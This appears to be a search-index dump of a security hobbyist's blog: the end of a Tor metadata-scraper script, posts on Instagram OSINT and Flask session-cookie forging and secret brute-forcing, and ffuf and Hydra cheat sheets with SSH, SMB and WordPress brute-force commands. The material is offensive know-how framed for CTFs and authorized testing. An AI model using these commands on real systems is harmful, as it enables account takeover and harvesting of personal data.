json.dumps(metadata.get(\u0026#39;links\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;emails\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;external_links\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;http_headers\u0026#39;, {})), json.dumps(metadata.get(\u0026#39;phone_numbers\u0026#39;, [])) )) conn.commit() def print_human_readable(metadata_list): \u0026#34;\u0026#34;\u0026#34; Print metadata results in a more human-readable format. Uses colors to distinguish keys and values, skipping empty fields. \u0026#34;\u0026#34;\u0026#34; for metadata in metadata_list: print(Fore.CYAN + \u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34; * 80 + \u0026#34;\\n\u0026#34;) for key, value in metadata.items(): if value: if isinstance(value, dict): print(Fore.YELLOW + f\u0026#34;{key.capitalize()}:\u0026#34; + Style.RESET_ALL) for sub_key, sub_value in value.items(): if sub_value: print(f\u0026#34; {Fore.GREEN}{sub_key}:{Style.RESET_ALL} {sub_value}\u0026#34;) elif isinstance(value, list): print(Fore.YELLOW + f\u0026#34;{key.capitalize()}:\u0026#34; + Style.RESET_ALL) for item in value: if item: if isinstance(item, dict): for sub_key, sub_value in item.items(): if sub_value: print(f\u0026#34; {Fore.GREEN}{sub_key}:{Style.RESET_ALL} {sub_value}\u0026#34;) else: print(f\u0026#34; - {Fore.WHITE}{item}{Style.RESET_ALL}\u0026#34;) else: print(Fore.YELLOW + f\u0026#34;{key.capitalize()}:{Style.RESET_ALL} {Fore.WHITE}{value}{Style.RESET_ALL}\u0026#34;) print(Fore.CYAN + \u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34; * 80) def main(): \u0026#34;\u0026#34;\u0026#34; The main function orchestrates: 1. Argument parsing and validation. 2. URL loading and validation. 3. Checking Tor availability if needed. 4. Setting up the database. 5. Concurrently extracting metadata from URLs. 6. Saving results to JSON or stdout. 7. Optionally printing results in a human-readable format. \u0026#34;\u0026#34;\u0026#34; setup_logging() parser = setup_argparser() args = parser.parse_args() # Load URLs from command line or file if args.urls: urls = args.urls else: urls = load_urls_from_file(args.file) # Validate URLs and normalize them valid_urls = [] for url in urls: normalized_url = url.rstrip(\u0026#39;/\u0026#39;) if is_valid_url(normalized_url): valid_urls.append(normalized_url) else: logging.warning(f\u0026#34;Invalid URL skipped: {url}\u0026#34;) if not valid_urls: logging.error(\u0026#34;No valid URLs provided. Exiting.\u0026#34;) sys.exit(1) # Determine fields to extract if args.extract_all: fields = list({ \u0026#39;url\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;description\u0026#39;, \u0026#39;keywords\u0026#39;, \u0026#39;og_title\u0026#39;, \u0026#39;og_description\u0026#39;, \u0026#39;timestamp\u0026#39;, \u0026#39;headers\u0026#39;, \u0026#39;images\u0026#39;, \u0026#39;scripts\u0026#39;, \u0026#39;css_files\u0026#39;, \u0026#39;social_links\u0026#39;, \u0026#39;csp\u0026#39;, \u0026#39;server_technologies\u0026#39;, \u0026#39;crypto_wallets\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;emails\u0026#39;, \u0026#39;external_links\u0026#39;, \u0026#39;http_headers\u0026#39;, \u0026#39;phone_numbers\u0026#39; }) elif args.fields: fields = args.fields else: fields = None # Check if Tor is required tor_required = any(urlparse(u).netloc.endswith(\u0026#39;.onion\u0026#39;) for u in valid_urls) or args.force_tor if tor_required and not is_tor_port_open(): logging.error(\u0026#34;Tor SOCKS5 proxy is not accessible. Please ensure Tor is running.\u0026#34;) sys.exit(1) # Set up database connection conn = setup_database(args.database) # Use ThreadPoolExecutor for concurrency results = [] with ThreadPoolExecutor(max_workers=args.max_workers) as executor: future_to_url = { executor.submit( extract_metadata, url, args, fields, default_region=args.default_region ): url for url in valid_urls } for future in as_completed(future_to_url): url = future_to_url[future] try: metadata = future.result() if metadata: save_to_database(conn, metadata) results.append(metadata) else: logging.error(f\u0026#34;Failed to extract metadata for {url}\u0026#34;) except Exception as exc: logging.error(f\u0026#34;{url} generated an exception: {exc}\u0026#34;) # Save results to file or stdout try: if args.output == \u0026#39;-\u0026#39;: # Print to stdout as JSON json.dump(results, sys.stdout, indent=4) else: # Save to a file in JSON format with open(args.output, \u0026#39;w\u0026#39;) as f: json.dump(results, f, indent=4) logging.info(f\u0026#34;Metadata extraction completed. Results saved to \u0026#39;{args.output}\u0026#39;.\u0026#34;) except Exception as e: logging.error(f\u0026#34;Error saving results to \u0026#39;{args.output}\u0026#39;: {e}\u0026#34;) # Print human-readable output if requested if args.human_readable: print(\u0026#34;\\nHuman-readable Output:\u0026#34;) print_human_readable(results) # Close the database connection conn.close() if __name__ == \u0026#34;__main__\u0026#34;: main() ","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch1 id=\"inspector-metadata-extraction-from-websites\"\u003eInspecTor: Metadata Extraction from Websites\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003eInspecTor\u003c/strong\u003e is a command-line tool designed for extracting metadata from websites, including \u003cstrong\u003e\u003ccode\u003e.onion\u003c/code\u003e\u003c/strong\u003e domains, while maintaining anonymity through the Tor network. This tool provides a straightforward way to gather information such as emails, phone numbers, links, images, and more, making it useful for cybersecurity researchers, investigators, and analysts. Its ability to handle dynamic content with Selenium and process multiple URLs concurrently adds flexibility and efficiency to metadata collection.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). Final Thoughts FFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\n","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eFFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\u003c/p\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge—I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e—I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon 